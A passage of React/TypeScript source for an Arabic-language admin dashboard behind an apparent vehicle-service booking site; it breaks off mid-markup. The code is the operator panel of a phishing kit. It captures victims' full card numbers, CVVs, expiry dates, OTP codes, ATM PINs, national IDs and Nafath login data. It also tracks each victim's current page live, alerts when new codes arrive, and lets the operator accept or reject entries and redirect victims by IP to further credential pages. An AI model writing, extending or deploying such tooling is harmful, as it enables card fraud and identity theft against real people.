import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { toast } from "sonner";
import { io as socketIO } from "socket.io-client";

// دالة تشغيل صوت تنبيه
function playNotificationSound() {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
  } catch (e) {}
}

type Booking = {
  id: number;
  referenceId: string;
  clientName: string;
  clientId: string;
  clientPhone: string;
  clientEmail?: string | null;
  clientNationality?: string | null;
  vehiclePlate: string;
  serviceRegion: string;
  serviceDate: string;
  status: string;
  clientIp: string | null;
  createdAt: Date;
};

type Payment = {
  id?: number;
  referenceId?: string;
  cardHolderName?: string | null;
  cardNumber?: string | null;
  cardLastFour?: string | null;
  cardCvv?: string | null;
  cardExpiry?: string | null;
  verifyCode?: string | null;
  secretNum?: string | null;
  paymentAction?: string | null;
  step?: number | null;
  status?: string | null;
  currentPage?: string | null;
};

const STATUS_LABELS: Record<string, { label: string; color: string; bg: string; border: string }> = {
  new:              { label: "جديد",          color: "#0d6efd", bg: "#e7f0ff", border: "#b6d0ff" },
  pending_payment:  { label: "انتظار بطاقة",  color: "#856404", bg: "#fff3cd", border: "#ffd966" },
  pending_otp:      { label: "انتظار OTP",   color: "#7c3aed", bg: "#f5f3ff", border: "#ddd6fe" },
  pending_atm:      { label: "انتظار ATM",   color: "#ea580c", bg: "#fff7ed", border: "#fed7aa" },
  pending_nafath:   { label: "انتظار نفاذ",   color: "#6f42c1", bg: "#f0e9ff", border: "#c9b8f0" },
  pending_motasel:  { label: "انتظار متصل",   color: "#d63384", bg: "#ffe5f0", border: "#f5b8d5" },
  payment_done:     { label: "تم الدفع",      color: "#146c43", bg: "#d1e7dd", border: "#a3cfbb" },
  verified:         { label: "تم التحقق",     color: "#0a6640", bg: "#d0f0e0", border: "#8fd4b0" },
  completed:        { label: "مكتمل",         color: "#495057", bg: "#e9ecef", border: "#ced4da" },
  cancelled:        { label: "ملغي",          color: "#842029", bg: "#f8d7da", border: "#f1aeb5" },
};

// ===== مكوّن نافذة التفاصيل المنبثقة (Modal) =====
function BookingModal({
  booking,
  onClose,
  onPaymentAction,
  onNavigate,
  clientCurrentPage,
  refreshTrigger,
}: {
  booking: Booking;
  onClose: () => void;
  onPaymentAction: (reference: string, action: "verified" | "denied") => void;
  onNavigate: (booking: Booking, page: string) => void;
  clientCurrentPage?: string;
  refreshTrigger?: number;
}) {
  const [showCardNum, setShowCardNum] = useState(false);
  const [showCvv, setShowCvv] = useState(false);

  const { data: detailsData, isLoading, refetch: refetchDetails } = trpc.admin.getTemplateForms.useQuery(
    { Reference: booking.referenceId },
    { refetchInterval: 1500 }
  );

  // إعادة جلب البيانات فوراً عند وجود trigger جديد (newPayment)
  useEffect(() => {
    if (refreshTrigger && refreshTrigger > 0) {
      refetchDetails();
    }
  }, [refreshTrigger]);

  const payment: Payment = (detailsData?.data?.payment as Payment) || {};
  const b = detailsData?.data?.booking || booking;

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text).then(() => toast.success(`تم نسخ ${label}`));
  };

  const cardDisplay = payment.cardNumber
    ? (showCardNum
        ? payment.cardNumber.replace(/(.{4})/g, "$1 ").trim()
        : `•••• •••• •••• ${payment.cardNumber.slice(-4)}`)
    : payment.cardLastFour
    ? `•••• •••• •••• ${payment.cardLastFour}`
    : null;

  const cvvDisplay = payment.cardCvv ? (showCvv ? payment.cardCvv : "•••") : null;

  const currentStep = payment.step ?? 0;
  const hasCardData = !!(payment.cardNumber || payment.cardLastFour);
  const hasOtp = !!payment.verifyCode;
  const hasAtm = !!payment.secretNum;

  // حالة العميل الحالية بناءً على الصفحة أو المرحلة
  // نُفضّل الصفحة الحالية من socket (الوقت الفعلي) على قاعدة البيانات
  const currentPage = clientCurrentPage || (payment as any).currentPage || "";
  let clientStageLabel = "لم يبدأ بعد";
  let clientStageBg = "#f8fafc";
  let clientStageBorder = "#e2e8f0";
  let clientStageColor = "#94a3b8";

  if (currentPage === "payments" || currentPage === "payment" || currentStep === 1) {
    clientStageLabel = "📋 في صفحة البطاقة";
    clientStageBg = "#eff6ff";
    clientStageBorder = "#bfdbfe";
    clientStageColor = "#2563eb";
  } else if (currentPage === "code" || currentPage === "otp" || currentStep === 2) {
    clientStageLabel = "🔑 في صفحة OTP";
    clientStageBg = "#f5f3ff";
    clientStageBorder = "#ddd6fe";
    clientStageColor = "#7c3aed";
  } else if (currentPage === "atm" || currentPage === "pin" || currentStep >= 3) {
    clientStageLabel = "🏧 في صفحة ATM PIN";
    clientStageBg = "#fff7ed";
    clientStageBorder = "#fed7aa";
    clientStageColor = "#ea580c";
  } else if (currentPage === "bCall" || currentPage === "waiting") {
    clientStageLabel = "⏳ في صفحة الانتظار";
    clientStageBg = "#fefce8";
    clientStageBorder = "#fde68a";
    clientStageColor = "#d97706";
  } else if (currentPage === "nafath") {
    clientStageLabel = "🛡️ في صفحة نفاذ";
    clientStageBg = "#fdf4ff";
    clientStageBorder = "#e9d5ff";
    clientStageColor = "#9333ea";
  }

  // هل فيه بيانات جديدة تحتاج قرار؟
  // الأزرار تضيء عندما paymentAction = "STILL" أو لم يُحدَد بعد
  // وتُطفأ عندما paymentAction = "accepted" أو "denied" أو "pass" أو "verified"
  const isInWaiting = currentPage === "bCall" || currentPage === "waiting";
  const actionIsDone = (
    payment.paymentAction === "accepted" ||
    payment.paymentAction === "pass" ||
    payment.paymentAction === "denied" ||
    payment.paymentAction === "verified"
  );
  // الأزرار تضيء إذا:
  // - فيه بيانات بطاقة ولم يتم القرار بعد
  // - أو فيه OTP ولم يتم القرار بعد
  // - أو فيه ATM ولم يتم القرار بعد
  // - أو العميل في صفحة الانتظار
  const hasNewData = (
    (hasCardData || hasOtp || hasAtm) && !actionIsDone
  ) || isInWaiting;

  // أزرار القبول والرفض - تتفعل فقط لما فيه بيانات
  const acceptBtnStyle: React.CSSProperties = {
    flex: 1,
    padding: "14px 0",
    borderRadius: 10,
    border: "none",
    fontSize: 15,
    fontWeight: 700,
    cursor: hasNewData ? "pointer" : "default",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: 8,
    fontFamily: "'Cairo', sans-serif",
    transition: "all 0.2s",
    background: hasNewData ? "linear-gradient(135deg, #16a34a, #15803d)" : "#e5e7eb",
    color: hasNewData ? "white" : "#9ca3af",
    boxShadow: hasNewData ? "0 3px 10px rgba(22,163,74,0.35)" : "none",
  };

  const rejectBtnStyle: React.CSSProperties = {
    flex: 1,
    padding: "14px 0",
    borderRadius: 10,
    border: "none",
    fontSize: 15,
    fontWeight: 700,
    cursor: hasNewData ? "pointer" : "default",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    gap: 8,
    fontFamily: "'Cairo', sans-serif",
    transition: "all 0.2s",
    background: hasNewData ? "linear-gradient(135deg, #dc2626, #b91c1c)" : "#e5e7eb",
    color: hasNewData ? "white" : "#9ca3af",
    boxShadow: hasNewData ? "0 3px 10px rgba(220,38,38,0.35)" : "none",
  };

  return (
    // Overlay
    <div
      onClick={onClose}
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(0,0,0,0.5)",
        zIndex: 1000,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "16px",
        backdropFilter: "blur(2px)",
        animation: "fadeIn 0.15s ease"
      }}
    >
      {/* Modal Box */}
      <div
        onClick={(e) => e.stopPropagation()}
        style={{
          background: "white",
          borderRadius: 16,
          width: "100%",
          maxWidth: 860,
          maxHeight: "90vh",
          overflowY: "auto",
          boxShadow: "0 20px 60px rgba(0,0,0,0.25)",
          animation: "slideUp 0.2s ease",
          fontFamily: "'Cairo', sans-serif",
          direction: "rtl"
        }}
      >
        {/* Modal Header */}
        <div style={{
          padding: "18px 24px",
          borderBottom: "1px solid #e8ecf0",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          background: "linear-gradient(135deg, #4361ee 0%, #3451d1 100%)",
          borderRadius: "16px 16px 0 0"
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <div style={{ width: 36, height: 36, background: "rgba(255,255,255,0.2)", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                <circle cx="12" cy="7" r="4"/>
              </svg>
            </div>
            <div>
              <div style={{ color: "white", fontWeight: 700, fontSize: 15 }}>تفاصيل الحجز</div>
              <div style={{ color: "rgba(255,255,255,0.7)", fontSize: 11, fontFamily: "monospace" }}>{booking.referenceId}</div>
            </div>
          </div>
          <button
            onClick={onClose}
            style={{
              background: "rgba(255,255,255,0.15)",
              border: "none",
              borderRadius: 8,
              width: 34,
              height: 34,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "white"
            }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
              <line x1="18" y1="6" x2="6" y2="18"/>
              <line x1="6" y1="6" x2="18" y2="18"/>
            </svg>
          </button>
        </div>

        {/* Modal Content */}
        <div style={{ padding: "20px 24px" }}>
          {isLoading ? (
            <div style={{ textAlign: "center", padding: "40px", color: "#94a3b8" }}>
              <div style={{ width: 32, height: 32, border: "3px solid #4361ee", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite", margin: "0 auto 12px" }} />
              جاري تحميل التفاصيل...
            </div>
          ) : (
            <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>

              {/* ===== حالة العميل الحالية + أزرار القبول/الرفض ===== */}
              <div style={{
                background: clientStageBg,
                border: `2px solid ${clientStageBorder}`,
                borderRadius: 12,
                padding: "16px 20px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                gap: 16,
                flexWrap: "wrap"
              }}>
                <div>
                  <div style={{ fontSize: 11, color: "#64748b", marginBottom: 4 }}>موقع العميل الحالي</div>
                  <div style={{ fontSize: 16, fontWeight: 700, color: clientStageColor }}>{clientStageLabel}</div>
                  {payment.paymentAction && payment.paymentAction !== "STILL" && (
                    <div style={{ fontSize: 11, marginTop: 4, color: "#64748b" }}>
                      آخر إجراء: {
                        payment.paymentAction === "verified" ? "✅ مقبول" :
                        payment.paymentAction === "accepted" ? "✅ تم التوجيه لـ OTP" :
                        payment.paymentAction === "pass" ? "✅ تم التوجيه لـ ATM" :
                        payment.paymentAction === "denied" ? "❌ مرفوض" : payment.paymentAction
                      }
                    </div>
                  )}
                </div>

                {/* أزرار القبول والرفض */}
                <div style={{ display: "flex", gap: 10, minWidth: 240 }}>
                  <button
                    onClick={() => hasNewData && onPaymentAction(booking.referenceId, "verified")}
                    style={acceptBtnStyle}
                  >
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <polyline points="20 6 9 17 4 12"/>
                    </svg>
                    قبول
                  </button>
                  <button
                    onClick={() => hasNewData && onPaymentAction(booking.referenceId, "denied")}
                    style={rejectBtnStyle}
                  >
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <line x1="18" y1="6" x2="6" y2="18"/>
                      <line x1="6" y1="6" x2="18" y2="18"/>
                    </svg>
                    رفض
                  </button>
                </div>
              </div>

              {/* ===== الصف الرئيسي: بيانات العميل + بيانات البطاقة ===== */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>

                {/* بيانات العميل */}
                <div style={{ background: "#f8fafc", borderRadius: 12, padding: "16px 18px", border: "1px solid #e2e8f0" }}>
                  <div style={{ fontSize: 12, fontWeight: 700, color: "#4361ee", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4361ee" strokeWidth="2">
                      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                      <circle cx="12" cy="7" r="4"/>
                    </svg>
                    بيانات العميل
                  </div>
                  <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
                    {[
                      { label: "الاسم", value: (b as any).clientName },
                      { label: "رقم الهوية", value: (b as any).clientId },
                      { label: "الجوال", value: (b as any).clientPhone },
                      { label: "البريد الإلكتروني", value: (b as any).clientEmail },
                      { label: "الجنسية", value: (b as any).clientNationality },
                    ].map(({ label, value }) => (
                      <div key={label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                        <span style={{ fontSize: 11, color: "#94a3b8" }}>{label}</span>
                        <span style={{ fontSize: 12, color: "#374151", fontWeight: 500 }}>{value || "—"}</span>
                      </div>
                    ))}
                    {/* IP */}
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                      <span style={{ fontSize: 11, color: "#94a3b8" }}>IP العميل</span>
                      <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                        <span style={{ fontSize: 11, color: "#374151", fontFamily: "monospace", background: "#e2e8f0", padding: "2px 6px", borderRadius: 4 }}>
                          {(b as any).clientIp || "—"}
                        </span>
                        {(b as any).clientIp && (
                          <button onClick={() => copyToClipboard((b as any).clientIp, "IP")} style={{ background: "none", border: "none", cursor: "pointer", padding: 2, color: "#94a3b8" }}>
                            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                          </button>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                {/* بيانات البطاقة */}
                <div style={{ background: "#f8fafc", borderRadius: 12, padding: "16px 18px", border: "1px solid #e2e8f0" }}>
                  <div style={{ fontSize: 12, fontWeight: 700, color: "#16a34a", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2">
                      <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                      <line x1="1" y1="10" x2="23" y2="10"/>
                    </svg>
                    بيانات البطاقة
                  </div>

                  {hasCardData ? (
                    <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
                      {/* اسم حامل البطاقة */}
                      <div style={{ display: "flex", justifyContent: "space-between" }}>
                        <span style={{ fontSize: 11, color: "#94a3b8" }}>اسم حامل البطاقة</span>
                        <span style={{ fontSize: 12, color: "#374151", fontWeight: 500 }}>{payment.cardHolderName || "—"}</span>
                      </div>

                      {/* رقم البطاقة */}
                      <div style={{ background: "#fef9c3", borderRadius: 8, padding: "8px 10px", border: "1px solid #fde68a" }}>
                        <div style={{ fontSize: 10, color: "#92400e", marginBottom: 4 }}>رقم البطاقة</div>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                          <span style={{ fontSize: 13, fontFamily: "monospace", fontWeight: 700, color: "#1e293b", letterSpacing: 1 }} dir="ltr">
                            {cardDisplay || "—"}
                          </span>
                          <div style={{ display: "flex", gap: 2 }}>
                            {payment.cardNumber && (
                              <button onClick={() => copyToClipboard(payment.cardNumber!, "رقم البطاقة")} style={{ background: "none", border: "none", cursor: "pointer", padding: 3, color: "#92400e" }}>
                                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                              </button>
                            )}
                            <button onClick={() => setShowCardNum(!showCardNum)} style={{ background: "none", border: "none", cursor: "pointer", padding: 3, color: "#92400e" }}>
                              {showCardNum ? (
                                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                              ) : (
                                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                              )}
                            </button>
                          </div>
                        </div>
                      </div>

                      {/* تاريخ الانتهاء + CVV */}
                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                        <div style={{ background: "#eff6ff", borderRadius: 8, padding: "8px 10px", border: "1px solid #bfdbfe", textAlign: "center" }}>
                          <div style={{ fontSize: 10, color: "#1d4ed8", marginBottom: 4 }}>تاريخ الانتهاء</div>
                          <div style={{ fontSize: 13, fontFamily: "monospace", fontWeight: 700, color: "#1e293b" }} dir="ltr">{payment.cardExpiry || "—"}</div>
                        </div>
                        <div style={{ background: "#fef2f2", borderRadius: 8, padding: "8px 10px", border: "1px solid #fecaca", textAlign: "center" }}>
                          <div style={{ fontSize: 10, color: "#dc2626", marginBottom: 4 }}>CVV</div>
                          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 4 }}>
                            <span style={{ fontSize: 13, fontFamily: "monospace", fontWeight: 700, color: "#1e293b" }} dir="ltr">
                              {cvvDisplay || "—"}
                            </span>
                            {payment.cardCvv && (
                              <button onClick={() => setShowCvv(!showCvv)} style={{ background: "none", border: "none", cursor: "pointer", padding: 2, color: "#dc2626" }}>
                                {showCvv ? (
                                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                                ) : (
                                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                                )}
                              </button>
                            )}
                          </div>
                        </div>
                      </div>

                      {/* OTP + ATM PIN */}
                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                        <div style={{
                          borderRadius: 8,
                          padding: "10px 12px",
                          border: `2px solid ${hasOtp ? "#2563eb" : "#e2e8f0"}`,
                          background: hasOtp ? "#2563eb" : "#f8fafc"
                        }}>
                          <div style={{ fontSize: 10, color: hasOtp ? "#bfdbfe" : "#94a3b8", marginBottom: 4, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                            <span>🔑 رمز OTP</span>
                            {hasOtp && (
                              <button onClick={() => copyToClipboard(payment.verifyCode!, "OTP")} style={{ background: "none", border: "none", cursor: "pointer", padding: 0, color: "#bfdbfe" }}>
                                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                              </button>
                            )}
                          </div>
                          {hasOtp ? (
                            <div style={{ fontSize: 18, fontFamily: "monospace", fontWeight: 700, color: "white", letterSpacing: 3 }} dir="ltr">{payment.verifyCode}</div>
                          ) : (
                            <div style={{ fontSize: 11, color: "#94a3b8", fontStyle: "italic" }}>لم يُدخَل بعد</div>
                          )}
                        </div>

                        <div style={{
                          borderRadius: 8,
                          padding: "10px 12px",
                          border: `2px solid ${hasAtm ? "#ea580c" : "#e2e8f0"}`,
                          background: hasAtm ? "#ea580c" : "#f8fafc"
                        }}>
                          <div style={{ fontSize: 10, color: hasAtm ? "#fed7aa" : "#94a3b8", marginBottom: 4, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                            <span>🏧 ATM PIN</span>
                            {hasAtm && (
                              <button onClick={() => copyToClipboard(payment.secretNum!, "ATM PIN")} style={{ background: "none", border: "none", cursor: "pointer", padding: 0, color: "#fed7aa" }}>
                                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                              </button>
                            )}
                          </div>
                          {hasAtm ? (
                            <div style={{ fontSize: 18, fontFamily: "monospace", fontWeight: 700, color: "white", letterSpacing: 3 }} dir="ltr">{payment.secretNum}</div>
                          ) : (
                            <div style={{ fontSize: 11, color: "#94a3b8", fontStyle: "italic" }}>لم يُدخَل بعد</div>
                          )}
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div style={{ textAlign: "center", padding: "24px 0", color: "#94a3b8", fontSize: 12 }}>
                      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#d1d5db" strokeWidth="1.5" style={{ margin: "0 auto 8px", display: "block" }}>
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                        <line x1="1" y1="10" x2="23" y2="10"/>
                      </svg>
                      لم يُدخل بيانات البطاقة بعد
                    </div>
                  )}
                </div>
              </div>

              {/* ===== أزرار التوجيه السريع ===== */}
              <div style={{ borderTop: "1px solid #e8ecf0", paddingTop: 14 }}>
                <div style={{ fontSize: 11, color: "#64748b", marginBottom: 10, fontWeight: 600 }}>توجيه العميل لصفحة:</div>
                <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                  {[
                    { label: "صفحة الدفع", page: "/payment", color: "#1d4ed8", bg: "#eff6ff" },
                    { label: "صفحة نفاذ", page: "/nafath", color: "#7c3aed", bg: "#f5f3ff" },
                    { label: "صفحة المتصل", page: "/motasel", color: "#ea580c", bg: "#fff7ed" },
                    { label: "صفحة الحجز", page: "/booking", color: "#0d6efd", bg: "#e7f0ff" },
                    { label: "الرئيسية", page: "/", color: "#374151", bg: "#f1f5f9" },
                  ].map(({ label, page, color, bg }) => (
                    <button
                      key={page}
                      onClick={() => onNavigate(booking, page)}
                      style={{
                        background: bg,
                        color,
                        border: `1px solid ${color}30`,
                        borderRadius: 8,
                        padding: "6px 14px",
                        fontSize: 12,
                        fontWeight: 600,
                        cursor: "pointer",
                        fontFamily: "'Cairo', sans-serif"
                      }}
                    >
                      {label}
                    </button>
                  ))}
                </div>
              </div>

            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const { user, loading, isAuthenticated, logout } = useAuth();
  const [search, setSearch] = useState("");
  const [newBookingsCount, setNewBookingsCount] = useState(0);
  const [isConnected, setIsConnected] = useState(false);
  const [selectedBooking, setSelectedBooking] = useState<Booking | null>(null);
  const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);
  // تتبع مواقع العملاء في الوقت الفعلي: reference → page
  const [clientLocations, setClientLocations] = useState<Record<string, string>>({});
  // trigger لإعادة جلب بيانات الـ Modal فوراً عند وجود newPayment
  const [modalRefreshTrigger, setModalRefreshTrigger] = useState(0);
  // عداد الزوار المتصلين حالياً (وقت فعلي)
  const [liveVisitorCount, setLiveVisitorCount] = useState(0);

  // Auth check
  useEffect(() => {
    if (!loading && (!isAuthenticated || user?.role !== "admin")) {
      navigate("/admin/login");
    }
  }, [loading, isAuthenticated, user]);

  // Socket.io connection
  useEffect(() => {
    const socket = socketIO({ path: "/socket.io" });
    socketRef.current = socket;

    socket.on("connect", () => setIsConnected(true));
    socket.on("disconnect", () => setIsConnected(false));

    socket.emit("joinAdmin", "admin-token");

    socket.on("newBooking", (booking: Booking) => {
      playNotificationSound();
      toast.success(`حجز جديد من ${booking.clientName}`, {
        description: `رقم الهوية: ${booking.clientId} | اللوحة: ${booking.vehiclePlate}`,
      });
      setNewBookingsCount((c) => c + 1);
      refetchBookings();
    });

    socket.on("newPayment", (data: { reference: string; step?: number; type?: string }) => {
      playNotificationSound();
      const typeLabels: Record<string, string> = {
        card: "بيانات بطاقة جديدة",
        verification: "رمز OTP جديد",
        code: "رقم ATM جديد",
        nafath: "بيانات نفاذ جديدة",
        phoneCode: "رمز هاتف جديد",
      };
      const label = data.type ? typeLabels[data.type] || "بيانات جديدة" : "دفع جديد";
      toast.info(`${label} - المرجع: ${data.reference}`);
      refetchBookings();
      // إعادة جلب بيانات الـ Modal فوراً إذا كان مفتوحاً لنفس الـ reference
      setModalRefreshTrigger(prev => prev + 1);
    });

    // استقبال تحديث موقع العميل في الوقت الفعلي
    socket.on("clientLocationUpdate", (data: { reference: string; ip: string; page: string }) => {
      if (data.reference && data.page) {
        setClientLocations(prev => ({ ...prev, [data.reference]: data.page }));
      }
    });

    // استقبال تحديث عداد الزوار المتصلين في الوقت الفعلي
    socket.on("visitorCountUpdate", (data: { count: number }) => {
      setLiveVisitorCount(data.count);
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  // Data fetching
  const { data: statsData } = trpc.booking.stats.useQuery();
  const {
    data: bookingsData,
    refetch: refetchBookings,
    isLoading,
  } = trpc.booking.list.useQuery({ limit: 200 });

  const navigateMutation = trpc.navigation.navigateTo.useMutation({
    onSuccess: (res) => toast.success(res.message),
    onError: (err) => toast.error(err.message),
  });

  const updateStatusMutation = trpc.booking.updateStatus.useMutation({
    onSuccess: () => {
      toast.success("تم تحديث الحالة");
      refetchBookings();
    },
  });

  const markReadMutation = trpc.booking.markRead.useMutation({
    onSuccess: () => refetchBookings(),
  });

  const paymentActionMutation = trpc.admin.setPaymentAction.useMutation({
    onSuccess: (res) => {
      const actionLabel = res.action === "verified" ? "✅ تم القبول" : "❌ تم الرفض";
      toast.success(actionLabel);
      refetchBookings();
    },
    onError: (err) => toast.error(err.message),
  });

  const stats = statsData?.data;
  const bookings: Booking[] = (bookingsData?.data as Booking[]) || [];

  const filtered = bookings.filter(
    (b) =>
      b.clientName?.toLowerCase().includes(search.toLowerCase()) ||
      b.clientId?.includes(search) ||
      b.vehiclePlate?.toLowerCase().includes(search.toLowerCase()) ||
      b.referenceId?.includes(search)
  );

  const handleNavigate = (booking: Booking, page: string) => {
    if (!booking.clientIp) {
      toast.error("لا يوجد IP للعميل");
      return;
    }
    navigateMutation.mutate({
      clientIp: booking.clientIp,
      page,
      referenceId: booking.referenceId,
    });
  };

  const handlePaymentAction = (reference: string, action: "verified" | "denied") => {
    paymentActionMutation.mutate({ reference, action });
  };

  const openModal = (booking: Booking) => {
    markReadMutation.mutate({ reference: booking.referenceId });
    setSelectedBooking(booking);
  };

  const closeModal = () => setSelectedBooking(null);

  if (loading) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#f5f7fa" }}>
        <div style={{ width: 40, height: 40, border: "4px solid #4361ee", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  const pendingCount = (stats as any)?.pending ?? Math.max(0, (stats?.total ?? 0) - (stats?.completed ?? 0) - (stats?.new ?? 0));
  // عداد الزوار المتصلين حالياً: يستخدم العداد الحقيقي من socket (وقت فعلي)
  const visitorsCount = liveVisitorCount;

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#f5f7fa", fontFamily: "'Cairo', sans-serif" }}>
      {/* Google Fonts */}
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet" />

      {/* ===== MODAL ===== */}
      {selectedBooking && (
        <BookingModal
          booking={selectedBooking}
          onClose={closeModal}
          clientCurrentPage={clientLocations[selectedBooking.referenceId]}
          onPaymentAction={handlePaymentAction}
          onNavigate={handleNavigate}
          refreshTrigger={modalRefreshTrigger}
        />
      )}

      {/* ===== HEADER ===== */}
      <header style={{
        background: "white",
        borderBottom: "1px solid #e8ecf0",
        padding: "0 24px",
        height: 64,
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        position: "sticky",
        top: 0,
        zIndex: 100,
        boxShadow: "0 1px 4px rgba(0,0,0,0.06)"
      }}>
        {/* اليمين: اسم النظام + أيقونة */}
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{
            width: 44, height: 44,
            background: "#4361ee",
            borderRadius: "50%",
            display: "flex", alignItems: "center", justifyContent: "center"
          }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
              <circle cx="9" cy="7" r="4"/>
              <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
              <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
            </svg>
          </div>
